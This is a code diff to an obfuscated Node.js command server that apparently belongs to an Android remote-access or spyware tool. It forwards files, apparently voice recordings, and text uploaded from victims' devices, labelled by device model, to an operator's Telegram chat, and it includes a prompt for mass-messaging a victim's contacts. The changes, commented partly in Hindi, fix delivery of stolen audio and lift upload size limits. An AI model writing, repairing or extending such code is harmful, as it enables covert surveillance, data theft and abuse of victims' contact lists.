@@ -1,3 +1,5 @@
+process.env.NTBA_FIX_350 = 1; // FIX 1: Telegram library bufffer and content-type bug fix
+
 const express = require('express'),
   webSocket = require('ws'),
   http = require('http'),
@@ -12,12 +14,11 @@ const token = process.env.TOKEN,
   address = 'https://www.google.com',
   app = express(),
   appServer = http.createServer(app),
-  appSocket = new webSocket.Server({ server: appServer, maxPayload: 100 * 1024 * 1024 }),
+  appSocket = new webSocket.Server({ server: appServer }),
   appBot = new telegramBot(token, { polling: true }),
   appClients = new Map(),
- upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } })
-app.use(bodyParser.json({ limit: '50mb' }))
-app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }))
+  upload = multer()
+app.use(bodyParser.json())
 let currentUuid = '',
   currentNumber = '',
   currentTitle = ''
@@ -26,7 +27,14 @@ app.get('/', function (_0x1b89da, _0x3398a0) {
     '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
   )
 })
+
+// FIX 2: Modified /uploadFile to correctly handle audio types and catch errors
 app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
+  if (!_0x1c67cf.file) {
+    console.log("No file was uploaded in the request.");
+    return _0x143a37.status(400).send('');
+  }
+  
   const _0x404b56 = _0x1c67cf.file.originalname
   appBot.sendDocument(
     id,
@@ -34,18 +42,19 @@ app.post('/uploadFile', upload.single('file'), (_0x1c67cf, _0x143a37) => {
     {
       caption:
         '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
-        _0x1c67cf.headers.model +
+        (_0x1c67cf.headers.model || 'Unknown Device') +
         '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
       parse_mode: 'HTML',
     },
     {
-      filename: _0x404b56,
-      contentType: 'application/octet-stream', // <--- 'application/txt' ki jagah ye dalo
+      filename: _0x404b56 || 'voice_record',
+      contentType: _0x1c67cf.file.mimetype || 'application/octet-stream', // FIXED: 'application/txt' hataya, dynamic ya stream set kiya
     }
-  ).catch((err) => console.log("Telegram Error: ", err.message)) // Isse error ka pata chalega
+  ).catch(err => console.log('Upload fail error:', err.message)); // Taki Render logs mein proper reason dikhe agar file block ho
+  
   _0x143a37.send('')
 })
-})
+
 app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
   appBot.sendMessage(
     id,
@@ -148,7 +157,7 @@ appBot.on('message', (_0x2ca88f) => {
       ))
     if (
       _0x2ca88f.reply_to_message.text.includes(
-        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68'
+        '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE58\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68'
       )
     ) {
       const _0x1f6562 = _0x2ca88f.text
